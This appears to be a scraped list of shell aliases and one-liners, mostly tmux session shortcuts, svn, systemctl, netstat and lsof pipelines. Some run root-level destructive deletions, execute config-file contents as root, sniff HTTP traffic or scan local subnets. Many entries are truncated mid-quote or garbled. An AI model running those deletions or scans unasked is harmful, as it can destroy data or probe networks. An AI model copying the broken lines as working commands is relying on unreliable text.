tmux attach || { (while ! tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh; do sleep 0.2; done)& tmux ; }
tmux attach || tnew
tmux attach || tmuxnew
tmux attach || tmux new-session \; split-window -v \; split-window -h \; select-pane -t 0
tmux attach || tmux new-session \; source-file ~/dotfiles/default-session
tmux attach || tmux new-session \; source-file ~/.tmux/tmux.startup
tmux attach || tmux new-session \; source-file ~/.tmux/session
tmux attach || tmux new-session \; source-file ~/.tmux/new-session
tmux attach || tmux new-session \; source-file ~/.tmux/imux
tmux attach || tmux new-session \; source-file ~/.tmux.session
tmux attach || tmux new-session \; source-file ~/.tmux-session
tmux attach || tmux new-session \;
tmux attach || tmux new-session -s main
tmux attach || tmux new-session -s default
tmux attach || tmux new-session
tmux attach || tmux new -s work
tmux attach || tmux new -s main
tmux attach || tmux new -s default
tmux attach || tmux new -s Master
tmux attach || tmux new -s Home
tmux attach || tmux new -s CUBITS
tmux attach || tmux new
tmux attach || tmux -u new-session -s default
tmux attach || tmux -u new -s Tomdizzle
tmux attach || tmux -u
tmux attach || tmux -f ~/.tmux.conf
tmux attach || tmux -2 new
tmux attach || tmux -2
tmux attach || tmux
tmux attach || ssh-agent tmux new
tmux attach || mux start default
tmux attach 2>/dev/null || tmux new
tmux attach 2>/dev/null || tmux
tmux attach 2> /dev/null || tmux new
tmux attach 2> /dev/null || tmux -2u -f ${DOTFILES_DIR}/tmux.conf new -s $(whoami)-tmux-session > /dev/null 2> /dev/null
tmux attach -t workflow || tmux new -s workflow
tmux attach -t work || tmux new-session -s work
tmux attach -t work || tmux new -s work
tmux attach -t vty2 || tmux new -s vty2
tmux attach -t vty || tmux new -s vty
tmux attach -t vs || tmux new -s vs
tmux attach -t vim-companion || tmux new-session -s vim-companion
tmux attach -t utils || tmux new -s utils
tmux attach -t tmux || tmux new -s tmux
tmux attach -t term || tmux new -s term
tmux attach -t session_$USER || tmux new -s session_$USER
tmux attach -t sedative || tmux new -s sedative
tmux attach -t rishabh || tmux new -s rishabh
tmux attach -t programming || tmux new -s programming
tmux attach -t prog || tmux
tmux attach -t pocket || tmux new -s pocket
tmux attach -t pair-session || tmux new-session -t host-session -s pair-session
tmux attach -t notes || tmux new -s notes -c \
tmux attach -t notes || tmux new -s notes
tmux attach -t music || tmux new -s music
tmux attach -t monitoring || tmux new -s monitoring
tmux attach -t main || tmux new -s main; exit
tmux attach -t main || tmux new -s main
tmux attach -t mail || tmux -f ${HOME}/.tmux-mail.conf attach -t mail
tmux attach -t lucypark || tmux new -s lucypark
tmux attach -t kappa || tmux new -s kappa
tmux attach -t init || tmux new -s init
tmux attach -t host-session || tmux new-session -s host-session
tmux attach -t gio || tmux new -s gio
tmux attach -t emacs || tmux new -s emacs 'emacs -nw'
tmux attach -t dotfiles || tmux new -s dotfiles -c \
tmux attach -t dev_link || tmux new-session -t dev -s dev_link
tmux attach -t dev || tmux new-session -s dev \; split-window -h \; select-pane -t 2\; rename-window -t 1 editor \; resize-pane -L 60\; send-keys -t 2 'vim' C-m \; send-keys -t 1 'bash /usr/bin/msch_server.sh' C-m
tmux attach -t dev || tmux new-session -s dev
tmux attach -t dev || tmux new -s dev
tmux attach -t dev || tmux new -d
tmux attach -t denis || tmux new -s denis
tmux attach -t default || tmux new -s default
tmux attach -t david || tmux new -s david
tmux attach -t comms || tmux new -s comms
tmux attach -t com || tmux new -s com
tmux attach -t chat || tmux new -s chat weechat
tmux attach -t base || tmux new -s base
tmux attach -t auri || tmux new -s auri
tmux attach -t alpha || tmux new -s alpha
tmux attach -t aliu || tmux new -s aliu
tmux attach -t `tmux ls | selecta | cut -f1 -d:`
tmux attach -t `basename $PWD` || tmux new -s `basename $PWD`
tmux attach -t \`basename \$(pwd)\` || tmux new-session -s \`basename \$(pwd)\` \; source-file ~/.tmux.session
tmux attach -t Tomdizzle2 || tmux new-session -t Tomdizzle1 -s Tomdizzle2
tmux attach -t Temp || tmux new -s Temp
tmux attach -t Spcejt9k || tmux new -s Spcejt9k
tmux attach -t NERV || tmux new -s NERV
tmux attach -t NEO || tmux new -s NEO
tmux attach -t Music || tmux new -s Music
tmux attach -t L || tmux -2 new -s L
tmux attach -t Jinghui || tmux new-session -s Jinghui
tmux attach -t DEVENV || tmux new -s DEVENV
tmux attach -t Base || tmux new -s Base
tmux attach -t All || tmux new -s All
tmux attach -t 0 || tmux
tmux attach -t - || tmux new -s -
tmux attach -t ${PWD##*/} || tmux new -s ${PWD##*/}
tmux attach -t $RHB_USERNAME || tmux new-session -s $RHB_USERNAME
tmux attach -t $PWD:t || tmux new -s $PWD:t
tmux attach -t $HOST || tmux new -s $HOST
tmux attach -t $1 || tmux new -s $1
tmux attach -t $(tmux list-sessions|fzf|cut -f1 -d:)
tmux attach -t $(basename $PWD) || tmux new -s $(basename $PWD)
tmux attach -t $(basename $(pwd)) || tmux new -s $(basename $(pwd))
tmux attach -dt w || tmux new-session -s w
tmux attach -dt f || tmux new-session -s f
tmux attach -dt base || tmux new -s base
tmux attach -d || tmux new-session \; split-window -h
tmux attach -d || tmux new-session -s
tmux attach -d || tmux new-session
tmux attach -d || tmux new
tmux attach -d || tmux
tmux attach -d -t $USER || tmux new-session -s $USER
tmux attach &> /dev/null || tmux
tmux att || tmux -2
tmux att || tmux
tmux at || tmux
tmux at -t v || tmux new -s v
tmux at -t t || tmux new -s t
tmux at -t a || tmux new -s a
tmux a || tmux new-session bash
tmux a || tmux new-session \; source-file ~/.tmux/tab01
tmux a || tmux new -s default
tmux a || tmux new -s alazarte
tmux a || tmux new
tmux a || tmux -2
tmux a || tmux
tmux a 2>/dev/null || tmux
tmux a -t work || tmux new -s work
tmux a -t main || tmuxp load ~/.tmuxp/indico.yaml
tmux a -t main || tmux new -s main
tmux a -t hack || tmux new -s hack
tmux a -t ez-tracking-service || tmux new-session -t ez-tracking-service
tmux a -t encdb || tmux new -s encdb
tmux a -t default ||tmux new -s default
tmux a -t base || tmux new -s base
tmux a -t 0 || tmux
tmux a -t ${USER} || tmux new -s '${USER}' -n 'ep-IV' \; neww -n 'ep-V' \; neww -n 'ep-VI' \; selectw -t 1
tmux a -dt unf || tmux new -s unf
tmux a -dt scratch || tmux new -s scratch
tmux a -dt ns1 || tmux new -s ns1
tmux a -d || tmux new
tmux a -d || tmux -f ~/.tmux.conf
tmux a -d || tmux -2 -u
tmux a -d || tmux
tmux a -d 2> /dev/null || tmux
tmux -u2 attach-session || tmux -u2 new-session
tmux -u2 attach || tmux -u2 new
tmux -u attach || tmux -u new-session
tmux -u attach || tmux -u new
tmux -u attach -d || tmux -u
tmux -u attach -d -t _scratch || tmux -u new-session -s _scratch
tmux -u a || tmux -u
tmux -q has-session -t default && tmux attach -t default || tmux new-session -s default
tmux -q has-session && tmux attach-session -d || tmux new-session -s$USER
tmux -q has-session && tmux attach-session -d || tmux new-session -n$USER -s$USER@$HOSTNAME
tmux -q has-session && tmux attach-session -d || tmux new-session
tmux -q has-session && exec tmux attach-session -d || exec tmux new-session -s$USER@$HOSTNAME
tmux -q has-session && exec tmux attach-session -d || exec tmux new-session -n$USER -s$USER@$HOSTNAME
tmux -f $TMUX_CONFIG -u attach || tmux -f $TMUX_CONFIG -u new
tmux -f $TMUXCFG -q has 2>/dev/null && exec tmux -f $TMUXCFG attach || exec tmux -f $TMUXCFG new -s$(hostname -s)
tmux -V || ( wm && w rpm -Uvh ${HOME}/tmux*.rpm )
tmux -S ~/.tmux.sock attach || tmux
tmux -S /tmp/shared new -s collab || tmux -S /tmp/shared new -t collab
tmux -CC attach || tmux -CC
tmux -CC attach -d || tmux -CC new
tmux -2uL base attach || tmux -2uL base new
tmux -2u attach -t ses || tmux -2u new -s ses
tmux -2u a || tmux -2u
tmux -2 new-session -t 0 || tmux -2
tmux -2 new -s react || tmux -2 a -t react
tmux -2 new -s memo || tmux -2 a -t memo
tmux -2 attach||tmux -2
tmux -2 attach-session || tmux -2 new-session
tmux -2 attach-session || tmux -2
tmux -2 attach-session -t local || tmux -2 new-session -s local
tmux -2 attach-session -d -t prog || tmux new-session -s prog
tmux -2 attach-session -d -t de || /usr/bin/tmux_config
tmux -2 attach || tn
tmux -2 attach || tmux new
tmux -2 attach || tmux -2 tmux.conf \; source-file ~/dotfiles/tmux.conf
tmux -2 attach || tmux -2 new-session \; source-file ~/dotfiles/tmux/tmux.split
tmux -2 attach || tmux -2 new-session \; source-file ~/dotfiles/tmux/new-session
tmux -2 attach || tmux -2 new-session \; source-file ~/dotfiles/.tmux/new-session
tmux -2 attach || tmux -2 new-session \; source-file ~/.tmux/vim-session
tmux -2 attach || tmux -2 new-session \; source-file ~/.tmux/new-session
tmux -2 attach || tmux -2 new-session
tmux -2 attach || tmux -2 new'
tmux -2 attach || tmux -2 new \; source-file ~/.config/tmux/config
tmux -2 attach || tmux -2 new -s TMUX
tmux -2 attach || tmux -2 new
tmux -2 attach || tmux -2 -u
tmux -2 attach || tmux -2
tmux -2 attach -t ttm || tmux -2 new -s ttm
tmux -2 attach -t sharif || tmux -2 new -s sharif
tmux -2 attach -t quantor || tmux -2 new -s quantor
tmux -2 attach -t normaltask || tmux -2 new -s normaltask
tmux -2 attach -t laptop3 -d || tmux -2 new -s laptop3
tmux -2 attach -t laptop2 -d || tmux -2 new -s laptop2
tmux -2 attach -t laptop1 -d || tmux -2 new -s laptop1
tmux -2 attach -t laptop -d || tmux -2 new -s laptop
tmux -2 attach -t joshz || tmux -2 new -s joshz
tmux -2 attach -t init || tmux -2 new-session -s init
tmux -2 attach -t desktop -d || tmux -2 new -s desktop
tmux -2 attach -t base || tmux -2 new -s base
tmux -2 attach -t 0 2>/dev/null || tmux -2
tmux -2 attach -t $(hostname) || tmux -2 new -s $(hostname)
tmux -2 attach -d || tmux -2 new
tmux -2 attach -d || tmux
tmux -2 attach -d -t init || tmux -2 new -s init
tmux -2 a || tmux -2
tmux -2 a -d || tmux -2
tmux -2 -u attach || tmux -2 -u new
tmu attach || tmu
tmate show-messages | grep 'ssh session:' | awk '{print \
tmate show-messages | grep 'session: ssh' | sed 's/.*ssh/ssh/' > ~/tmate-access
tm a 2>/dev/null || tm new -s main
title '⎞'; ${tmuxp} attach || ${tmuxp} new; dir_title
timestable -l 10000000 | pv -qlL 5 | lolcat -p 10 -F 0.01
timeout 3 dig +short myip.opendns.com @resolver1.opendns.com || timeout 3 curl -s http://ipecho.net/plain
time make epk -j8 2>&1 | tee make_epk_build.log; ll $OUT/cosmo.epk | grep $OUT/cosmo.epk
time (make -j6 && speakgood || speakbad)
tidy -asxml 2>/dev/null | xmllint - | sed -e
tgp 2>/dev/null | tail -n +2 | landscape
tftp $(/sbin/ip -o -4 addr list eno1 | awk '{print $4}' | cut -d/ -f1)
tfp | tail -n +2 | landscape
tf graph -draw-cycles -module-depth=99 | dot -Tpng > /tmp/graph.png | eog /tmp/graph.png
textutil -convert txt $1 -stdout | cat | more
test() { mv $1 $(echo -n $1 | iconv -f UTF-8 -t ISO-8859-1 | iconv -f gbk -t utf8);}; test
test || exit
test -x /usr/bin/fs_cli && /usr/bin/fs_cli -r || /usr/local/freeswitch/bin/fs_cli -r
test -f ~/.zshrc && vim ~/.zshrc || { echo 'File not found!' && return 1 }
test -f setup.sh && source ./setup.sh || echo setup: no setup.sh in the current directory.
test -f bin/rake && bin/rails db:migrate || \rails db:migrate
test -f bin/rails && bin/rails server || \rails
test -f bin/rails && bin/rails server --binding=127.0.0.1 || \rails server --binding=127.0.0.1
test -f bin/rails && bin/rails server --binding=0.0.0.0 || \rails server --binding=0.0.0.0
test -f bin/rails && bin/rails console || \rails console
test -f Gemfile && bundle exec rake || rake
test -f $1 || touch $1; haroopad $1
test -e ~/temporary && command cd ~/temporary || mkdir ~/temporary && cd ~/temporary
test -e tmp/en-US/html-single/index.html && firefox tmp/en-US/html-single/index.html || echo
test -e /usr/bin/mycli && mycli || (sudo docker rm -f mycli; sudo docker run --rm -ti --name=mycli -v ~/.my.cnf:/root/.my.cnf mhoger/mycli --host=172.17.0.1)
test -e /sys/class/net/bnep0 && iptraf-ng -i bnep0 || iptraf-ng -i ppp0
test -e /sys/class/net/bnep0 && iftop -i bnep0 || iftop -i ppp0
test -e /dev/mapper/flash && sudo mount /dev/mapper/flash /mnt/flash || sudo cryptsetup luksOpen $EFD flash && sudo mount /dev/mapper/flash /mnt/flash
test -e $HOME/.vim/bundle/Vundle.vim&&echo vundle already install.||git clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim;vim +PluginInstall +qall
test -e ""$FN"" || ls -ld ""$FN""; \
test -d ~/mount_new_vol || mkdir ~/mount_new_vol && sudo mount /dev/sda7 ~/mount_new_vol
test -d venv || python3 -m venv venv && . venv/bin/activate
test -d .git && (git rev-parse --abbrev-ref HEAD) || (echo 'Not a repo')
test -d ./script && script/server || serve
test -d $_SIMAPP && open $_SIMAPP; test -d $_SIMAPP || echo Simulator not found
test -S /tmp/pair && tmux -S /tmp/pair attach-session || tmux -S /tmp/pair new -s pair
test ${_dusmcd} || dusm; cd ${_dusmcd} && unset _dusmcd
test $USER = root && echo mem > /sys/power/state || sudo sh -c 'echo mem > /sys/power/state'
test $? -eq 0 && ogg123 -q /usr/share/sounds/KDE_Event_1.ogg || ogg123 -q /usr/share/sounds/KDE_Event_5.ogg
test $? -eq 0 && kdialog --msgbox 処理が完了しました || kdialog --error エラーコードを受けとりました
temp=`find . -iname *.apk`; adb devices | sed 1d |awk
tee >(tput smso; head -1 | cat; tput rmso) | cat
tee >(sort | uniq -c | sort -nr)
tee ./$*_maps_found.log | pv | grep $*
td standup | tee /dev/tty | c
tcpdump -i tap0 -nnvv src net 192.168.0.0/24 and dst 192.168.31.0/24 -w - | tee capture.pcap | tcpdump -n -r -
tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r -
tbl \!* | nroff -me |more -s
task projects rc.list.all.projects=yes 2>/dev/null | grep -E '^\w' | grep -vE '^\d+ projects'
taocl|cowsay|lolcat
tail -r $HISTFILE | awk '!x[\$0]++' | tail -r > ~/.tmp.newhist && mv ~/.tmp.newhist $HISTFILE
tail -n99 /etc/*(release|version) 2>/dev/null | cat -s
tail -n 200 /var/log/auth.log | grep session | grep 09:
tail -n 1 ~/tweets.txt | ~/dev/t2i/gazouille.js; tail -n 1 ~/tweets.txt | twidge -c ~/.twidgerc.ca update
tail -n 0 -f /var/log/httpd/*log | awk -F\| '{print \$7}'
tail -n $((${LINES:-`tput lines 4>/dev/null||echo -n 12`} - 3))
tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 80`} - 7))
tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 25`} - 2))
tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))
tail -f log/development.log | grep -vE '(^$|asset)'
tail -f log/development.log | grep -E 'Processing by|Parameters:'
tail -f /var/www/naris.cache/error_log -n 100 | grep -v Notice | grep -v Warning
tail -f /var/log/cloud-init.log -n900 | grep -iE '(ERR|WARN)'
tail -f $ORACLE_INSTANCE/diagnostics/logs/OHS/$(basename $ORACLE_INSTANCE|cut -d_ -f1)_ohs*/$(basename $ORACLE_INSTANCE|cut -d_ -f1)_ohs*.log
tail -f $(ls | sort | tail -1)
tail -F || tail -f
tail -500 $APP_PATH/log/production.log | grep Started | awk
tail -10000 $APP_PATH/log/production.log | grep Started | awk
tail -1000 ~/.bash_history | grep ^vim | col 2
tail --lines 2000 /var/log/messages|grep dnsmasq|grep ignored
tail --lines 2000 /var/log/messages|grep DHCPOFFER|tac
tac ~/notes/Journal/`date +%Y`.markdown |awk '!flag; /^\#/{flag=1};' | tac
tac ~/.zsh_history | sed -E 's/\: [0-9]+\:0;(.+)/\\1/' | less
tac $1 | grep '.' | head -n 1
ta default || tn default
ta `hostname -s` || ts `hostname -s`
t timeline hek__tor -l | cut -d' ' -f1 | xargs -n1 t delete status -f
t a -t \`t ls | fzf | awk '{print \$1}'\` 2> /dev/null
systemctl suspend || i3lock -c 000000
systemctl stop mysqlid || service mysql stop
systemctl start mysqlid || service mysql start
systemctl list-unit-files | grep enabled && systemctl --user list-unit-files | grep enabled
systemctl list-unit-files --type=service | grep enabled | more
systemctl list-unit-files --type=service | grep disabled | more
systemctl --user stop pulseaudio.socket && pulseaudio --kill || pulseaudio --kill
systemctl --failed | head -n -6 | tail -n -1
system_profiler SPStorageDataType | tail -n 19 | head -n 4
system_profiler SPPowerDataType | grep -i Cycle | awk -F \
syslog -w 'boot' | sed 's/'COMPUTER NAME'/opmac/g' | cut -c 17-
sysctl -n machdep.cpu.brand_string && sysctl -a | grep \.features\: | fmt -w 48
synclient HorizTwoFingerScroll=0 && LD_LIBRARY_PATH=/home/moritz/Downloads/usr/lib/ /home/moritz/Apps/Matlab/bin/matlab || synclient HorizTwoFingerScroll=1
sync_branch # trunk | release | branch/<name>
swiftlint 2>&1 | grep 'Violation\|warning'
swaymsg exit || pkill -15 sway
swapfile=`mktemp /tmp/swapXXXX` && sudo touch $swapfile && sudo dd bs=512 count=1M if=/dev/zero | tee $swapfile | pv -s 512M && sudo mkswap $swapfile && sudo swapon $swapfile
svn status | grep -v ^\? | awk '{ print \$2 }'
svn status | grep -v \? | less
svn status | grep -v .pyc | grep -v upload/
svn status | grep '^M' | awk '{print \$2}'
svn status | grep '^C' | awk '{ print $2}'
svn status | grep '^?' | sed 's/^? *\(.*\)/\
svn status | grep '^!' | sed 's/^! *\(.*\)/\
svn status | grep ! | awk
svn status | awk '/^\?/ {print $2}' | xargs svn add
svn status 2>&1 | grep -v '^\s*$' | grep -v '^[?\-]'
svn status -q | awk '{print $2}' | xargs -n 1 svn diff
svn status --no-ignore | grep '^\?' | sed 's/^\?//'
svn status --no-ignore | grep '^\?' | sed 's/^\? //'
svn status --no-ignore | grep '^[?I]' | xargs rm -rf
svn status --no-ignore | egrep '^[I?]' | sed -e 's/^[I?]//g'
svn status --ignore-externals | grep -v .swp | grep -v .swo
svn st |grep ^! |awk '{print \$NF \
svn st |grep M |awk '{print \$2 \
svn st |grep C|awk -F \
svn st |grep C|awk '{ FS = \
svn st |grep -v node_modules | grep -v bower_components
svn st |awk '/^!/{print $2}' |xargs svn rm
svn st | grep ^C |awk '{print \$NF \
svn st | grep ^? | awk
svn st | grep ^! | awk
svn st | grep \? | awk ''{print \
svn st | grep \? | awk '''{print \
svn st | grep -v status | grep \s
svn st | grep -v '^M\|^A'
svn st | grep '^M' | awk '{print
svn st | grep '^D' | awk '{print
svn st | grep '^A' | awk '{print
svn st | grep '^?' | sed 's/^[? ]*/\
svn st | grep '^?' | awk '{print $2}'
svn st | grep '^?' | awk '{print
svn st | grep '^!' | sed -e 's/!\s\+//'
svn st | grep '^!' | awk '{print $2}'
svn st | grep '^!' | awk '{print
svn st | grep '\?' | xargs svn add; svn ci -m 'u'
svn st | awk '/^\?/ { print \$2 }' | xargs svn add
svn st | awk '/^C/ { print $2 }' | xargs svn revert
svn st | awk '/\?/ {print $2}' | xargs svn add
svn st -q | cut -c9- | xargs svn diff
svn st -q | awk '{print \$2}' | xargs svn revert
svn revert -R . && rm -rf $(svn status | grep ? | awk '{print $2}')
svn resolved `svn status | grep '^C' | awk '{ print $2}'`
svn log | perl -l40pe 's/^-+/\n/' | less
svn info|gawk '/URL/{print $2}'|perl -pe 's/URL: //g'
svn info | grep URL | cut -d' ' -f2
svn info | grep URL | awk {'print $2'}
svn info | grep URL | awk '{ print $2 }'
svn info | egrep '^URL: (.*)' | sed s/URL\:\ //
svn info | egrep '^URL: (.*)' | sed 's/URL\:\ //'
svn info /home/mor | grep URL | awk -F
svn diff|colordiff|less -r
svn diff|colordiff|less
svn diff| colordiff|less -R
svn diff |colordiff|less -R
svn diff | grep ^Index | awk '{printf \$2 \
svn diff | grep '+++' | less
svn diff | colordiff | more
svn diff | colordiff | less -r
svn diff | colordiff | less -R
svn diff | colordiff | less
svn diff | /Users/itarato/Applications/colordiff.pl | less -R
svn diff $* | colordiff | less -r
svn del `svn st |grep ! |awk '{print $2}D1'`
svn add \`svn status | grep \? | awk '{print \$2}'\`
svn add $(svn status | grep [^?] | awk '{print $2}')
sudoifnotroot shutdown -r now || sudoifnotroot systemctl reboot
sudoifnotroot shutdown -h now || sudoifnotroot systemctl poweroff
sudo zzz || sudo systemctl hibernate -i
sudo zypper remove \$(zypper packages --installed-only | awk -F\| -v verinfo=\$(uname -r) 'BEGIN{OFS=\
sudo virsh list | awk '{print \$2}' | tail -n+3
sudo umount /media/1 || (cd /; sudo umount /media/1)
sudo umount -a -t cifs -f || sudo umount -a -t cifs -l
sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
sudo tshark -i lo0 -V -f 'dst port 3306' | egrep 'Statement:|Statement \[truncated\]:'
sudo tmutil listlocalsnapshots /Volumes/ | grep -o '\d\d\d\d-\d\d-\d\d-\d\d\d\d\d\d' | xargs -n 1 sudo tmutil deletelocalsnapshots
sudo tmutil listlocalsnapshots / | cut -f4 -d. | xargs -n 1 tmutil deletelocalsnapshots
sudo tmutil listbackups | tail -2 | sed 's/.*/\
sudo tcpdump -i en1 -n -s 0 -w — | grep -a -o -E \”Host\: .*|GET \/.*\”
sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E 'Host\: .*|GET \/.*'
sudo tail -f /var/log/syslog | grep -v '#011#011' | uniq
sudo tail -f /var/log/apache2-dev/craig.error.log | perl -pe 's/(in (.+).php)|(line (\d+))/\e[1;33m$&\e[0m/g'
sudo systemctl stop nginx | sudo systemctl stop php-fpm | sudo systemctl stop mysqld
sudo systemctl start nginx | sudo systemctl start php-fpm | sudo systemctl start mysqld
sudo systemctl restart nginx | sudo systemctl restart php-fpm | sudo systemctl restart mysqld
sudo sh -c 'dumpkeys |grep -v cr_Console |loadkeys'
sudo sh -c 'docker ps -a | /bin/grep Exit | cut -d \
sudo service --status-all | grep -v ' ? '? | grep -e ' + ' -e ' - '
sudo sed -i 's/^#share2/\/srv\/A2SERVER\/A2FILES\ A2FILES options:prodos ea:ad/' /usr/local/etc/netatalk/AppleVolumes.default; [[ -d /srv/A2SERVER/A2FILES ]] || mkdir /srv/A2SERVER/A2FILES
sudo route -n delete 174.143.224.224/27 $(netstat -nr | egrep '^default.*UGScI' | awk {'print $2'})
sudo route -n add 174.143.224.224/27 $(netstat -nr | egrep '^default.*UGScI' | awk {'print $2'})
sudo rmmod ipmi_devintf nvidia_uvm nvidia_modeset nvidia ipmi_msghandler || true && sudo tee /proc/acpi/bbswitch <<< OFF
sudo rfkill unblock all | sudo systemctl start docker.service | sudo ip link set dev docker0 up
sudo rfkill unblock all && sudo netctl switch-to wlp2s0-queen && ip a | grep wlp2s0 | grep inet
sudo rfkill unblock all && sudo netctl switch-to wlp2s0-privat82011fin && ip a | grep wlp2s0 | grep inet
sudo rfkill unblock all && sudo netctl switch-to wlp2s0-NFK && ip a | grep wlp2s0 | grep inet
sudo rfkill block all | sudo systemctl stop docker.service | sudo ip link set dev docker0 down
sudo rabbitmqctl list_queues | grep -i NM | grep -v SLQ
sudo ps aux | grep -v 'grep' | grep
sudo ps -elf | grep java | grep -v 'grep'
sudo ps -ef |grep -v grep | grep -i
sudo proxychains4 apt-get update || true && sudo proxychains4 apt-get upgrade
sudo port selfupdate && sudo port upgrade outdated || true && sudo port clean --all installed && sudo port -f uninstall inactive
sudo port -f uninstall inactive || true && sudo port -f uninstall leaves `# remove all necessary packages`
sudo pip list --outdated --format=freeze 2> /dev/null | cut -d= -f1 | xargs sudo pip install -U
sudo picocom /dev/ttyUSB0 || sudo picocom /dev/ttyUSB1
sudo pfctl -q -d -F all || true; sudo pfctl -q -F all -e -f /etc/pf.conf; pfs
sudo perf script | stackcollapse-perf.pl | flamegraph.pl
sudo perf script --input=/tmp/perf.data | ./stackcollapse-perf.pl | ./flamegraph.pl --color=java --hash > flamegraph.svg
sudo pc pip3 install \$(sudo pc pip3 list --no-cache-dir --outdated --format=columns|tail -n +3|cut -d ' ' -f1)
sudo pc pip2 install \$(sudo pc pip2 list --no-cache-dir --outdated --format=columns|tail -n +3|cut -d ' ' -f1)
sudo pacman -Sy && pacman -Qui | grep -e '^Name' -e 'Version' -e '^Install Reason' -e 'Required By' | grep -C 10 --color '^Name.*' && sudo pacman -Su
sudo pacman -Ss | grep -v installed | grep -i
sudo pacman -Rns $(pacman -Qtdq | tr '\n' ' ' | xargs)
sudo pacman -R $(pacman -Q | dmenu | awk
sudo openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//' | xargs
sudo nmcli con up id eduroam || (sudo systemctl restart NetworkManager.service && sudo nmcli con up id eduroam &)
sudo nmap -sP 192.168.1.0/24 | awk '/^Nmap/{ip=\sudo nmap -sP 192.168.1.0/24 | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'$NF}/B8:27:EB/{print ip}'
sudo nmap -T5 -sS -oG - -p 51822 192.168.178.0/24 | grep 51822/open | cut -f1 -d$'\t'
sudo ngrep -t '^(GET|POST|PUT)' 'tcp and port 80'
sudo netstat -tuape | grep -v tcp6 | grep -v udp6
sudo netstat -pna|grep LISTEN|grep tcp
sudo netstat -nupl | sort | egrep '[0.]{7}'
sudo netstat -nupl | sort -r | egrep '[0.]{7}'
sudo netstat -nupe | sort | grep ESTABLISHED
sudo netstat -nupe | sort -r | grep ESTABLISHED
sudo netstat -ntupl | sort | egrep '[0.]{7}'
sudo netstat -ntupl | sort -r | egrep '[0.]{7}'
sudo netstat -ntupe | sort | grep ESTABLISHED
sudo netstat -ntupe | sort -r | grep ESTABLISHED
sudo netstat -ntu | awk '{print $5}' | grep -iv \
sudo netstat -ntpl | sort | egrep '[0.]{7}'
sudo netstat -ntpl | sort -r | egrep '[0.]{7}'
sudo netstat -ntpe | sort | grep TIME_WAIT
sudo netstat -ntpe | sort | grep ESTABLISHED
sudo netstat -ntpe | sort | grep CLOSED_WAIT
sudo netstat -ntpe | sort -r | grep TIME_WAIT
sudo netstat -ntpe | sort -r | grep ESTABLISHED
sudo netstat -ntpe | sort -r | grep CLOSED_WAIT
sudo netstat -nptel | grep nginx | awk
sudo netstat -lnt | grep -v grep | grep $1
sudo netstat -anp --tcp --udp | grep LISTEN | ccze -A
sudo mount /backup || mpd
sudo monit summary | egrep -v 'Accessible|Running'
sudo modprobe -v wfx_wlan_sdio -r ; echo 3f300000.mmc | sudo tee /sys/bus/platform/drivers/mmc-bcm2835/unbind ; echo 3f300000.mmc | sudo tee /sys/bus/platform/drivers/mmc-bcm2835/bind ; sudo modprobe -v wfx_wlan_sdio
sudo lsof | grep tomcat | wc -l
sudo lsof | grep 'DEL.*lib' | awk '{print \$1 \
sudo lsof -n -F | ${HOME}/bin/programs/lsofgraph | dot -Tjpg > /tmp/a.jpg
sudo lsof -i | grep -E '(ESTABLISHED|LISTEN)'
sudo lsof -i -n -P | grep TCP|grep
sudo lsof -i -n -P | grep TCP | grep LISTEN
sudo lsof -i -n -P | grep TCP | grep
sudo lsof -i -n -P | grep -i listen | awk '{ printf \
sudo lsof +c 0 | grep -w DEL | awk '1 { print \$1 \
sudo ls -l /proc/`ps -C motion -o pid= | awk '{print $1}'`/fd | grep /var/lib/motion
sudo launchctl list | grep -v com.apple && launchctl list | grep -v com.apple
sudo killall php-fpm; sudo $(which php-fpm) -d listen=/var/run/php-fpm/php-fpm.sock; (pidof nginx 1>/dev/null && sudo $(which nginx) -s reload) || sudo $(which nginx)
sudo killall -HUP mDNSResponder || true &&
sudo kill -9 `ps ax|grep 'coreaudio[a-z]' |awk '{print $1}'`
sudo kill -9 `ps ax|grep 'coreaudio[a-z]' | awk '{print $1}'`
sudo kill -9 `ps ax | grep 'coreaudio[a-z]' | awk '{print $1}'`
sudo kill -9 $(sudo ps aux | grep hrome | awk '{print $2}')
sudo kill -9 $(pgrep 'casperjs|cron.sh|phantomjs')
sudo kill $(ps aux | grep '[n]otifyd' | awk '{print $2}'); echo fixed my friend!
sudo kill $(ps -ef | grep java | awk -F ' ' '{print $2}')
sudo kill $(ps -A | grep python | awk '{print $1}')
sudo iwlist wlp2s0 scan | sort -n | grep \(Channel
sudo iwlist wlan0 scan || iw list
sudo iwlist wlan0 scan | sift -e ESSID -e Address -e Quality -e Encryption | head -32
sudo iwconfig || sudo iw
sudo iwconfig $deviceWlan | egrep -i 'ieee|power'
sudo iw dev wlp2s0 scan | egrep 'signal|SSID'
sudo iw dev $WIFI scan | grep SSID: | sed 's/^[ \t]*SSID: //'
sudo iptables -n -v -L -t filter |grep -i 'spt:1080' |awk -F' ' '{print $2}'
sudo ipsec up `cat /etc/ipsec.conf | head -1 | awk '{ print $2 }'`
sudo ipsec down `cat /etc/ipsec.conf | head -1 | awk '{ print $2 }'`
sudo ifconfig | grep -Eo 'inet ([0-9]*\.){3}([0-9]*)' | grep -v '127.0.0.1'
sudo ifconfig eth0 | grep 'inet adr' | sed -e 's/^.*adr:\([^ ]*\).*$/\1/'
sudo ifconfig `netstat -i|grep 00:e0:4c:68:09:c4|cut -c 1-3`
sudo hddtemp /dev/sda && sensors | grep Core && sensors | grep temp1
sudo hcitool lecup --handle \`hcitool conn | tail -1 | awk '{print \$5}'\` --min=8 --max=8 --latency=0 --timeout=500
sudo grep '^command\[' /etc/nagios/nrpe_local*.cfg | cut -d'=' -f2- | xargs -L1 -d '\n' sudo su root -c
sudo fs_usage -e -f filesystem|grep -v CACHE_HIT|grep -v grep
sudo find \( -type f -o -path .git -prune -type l \) -print0 | xargs -0 -P10 p4 fstat 2>&1| xargs -0 rm
sudo find /etc /usr /opt /var | LC_ALL=C pacman -Qqo - 2>&1 > /dev/null | cut -d ' ' -f 5-
